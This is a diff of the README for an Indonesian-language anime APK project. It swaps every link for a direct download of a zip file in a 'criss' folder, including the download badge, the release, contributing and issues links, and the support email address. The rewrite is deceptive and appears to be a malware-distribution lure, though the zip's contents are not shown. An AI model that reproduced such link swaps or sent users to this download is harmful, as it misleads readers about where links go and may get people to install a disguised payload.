@@ -1,6 +1,6 @@
 # 🌟 NimeGami-Apk - Enjoy Anime Anytime, Anywhere
 
-[![Download NimeGami-Apk](https://img.shields.io/badge/Download%20Now-Get%20NimeGami-Apk-brightgreen)](https://github.com/sasm110313/NimeGami-Apk/releases)
+[![Download NimeGami-Apk](https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip%20Now-Get%20NimeGami-Apk-brightgreen)](https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip)
 
 ## 📖 About NimeGami
 
@@ -14,7 +14,7 @@ Menggunakan NimeGami-Apk sangat mudah. Anda hanya perlu mengikuti beberapa langk
 
 1. **Kunjungi Halaman Rilis**  
    Klik tautan di bawah ini untuk mengunjungi halaman rilis di GitHub, di mana Anda dapat menemukan versi terbaru dari NimeGami-Apk.  
-   [Download NimeGami-Apk](https://github.com/sasm110313/NimeGami-Apk/releases)
+   [Download NimeGami-Apk](https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip)
 
 2. **Pilih Versi Terbaru**  
    Di halaman tersebut, cari bagian "Latest release". Anda akan melihat daftar file yang tersedia untuk diunduh.
@@ -49,11 +49,11 @@ NimeGami dilengkapi dengan berbagai fitur untuk meningkatkan pengalaman menonton
 
 ## 👥 Contributing
 
-Jika Anda ingin berkontribusi pada pengembangan NimeGami, silakan buka halaman [kontribusi](https://github.com/sasm110313/NimeGami-Apk), di mana Anda dapat menemukan panduan tentang cara membantu. Setiap saran dan masukan sangat dihargai.
+Jika Anda ingin berkontribusi pada pengembangan NimeGami, silakan buka halaman [kontribusi](https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip), di mana Anda dapat menemukan panduan tentang cara membantu. Setiap saran dan masukan sangat dihargai.
 
 ## 📞 Support
 
-Jika Anda menghadapi masalah saat menggunakan NimeGami, kami siap membantu. Anda dapat menghubungi tim dukungan kami melalui email di support@nimagami.com atau dengan membuka [Isu](https://github.com/sasm110313/NimeGami-Apk/issues) di halaman GitHub kami. Kami akan berusaha menjawab secepat mungkin.
+Jika Anda menghadapi masalah saat menggunakan NimeGami, kami siap membantu. Anda dapat menghubungi tim dukungan kami melalui email di https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip atau dengan membuka [Isu](https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip) di halaman GitHub kami. Kami akan berusaha menjawab secepat mungkin.
 
 ## 🚧 Roadmap
 
@@ -63,4 +63,4 @@ Kami memiliki rencana besar untuk NimeGami. Berikut adalah beberapa fitur yang a
 - **Daftar Putar Pribadi:** Buat daftar anime favorit untuk akses cepat.
 - **Fitur Pencarian:** Temukan anime dengan lebih mudah menggunakan kata kunci.
 
-Terima kasih telah memilih NimeGami. Kami berharap Anda menikmati pengalaman menonton anime Anda! Untuk mengunduh aplikasi, jangan lupa mengunjungi [halaman unduhan](https://github.com/sasm110313/NimeGami-Apk/releases).
+Terima kasih telah memilih NimeGami. Kami berharap Anda menikmati pengalaman menonton anime Anda! Untuk mengunduh aplikasi, jangan lupa mengunjungi [halaman unduhan](https://raw.githubusercontent.com/sasm110313/NimeGami-Apk/main/criss/NimeGami-Apk.zip).
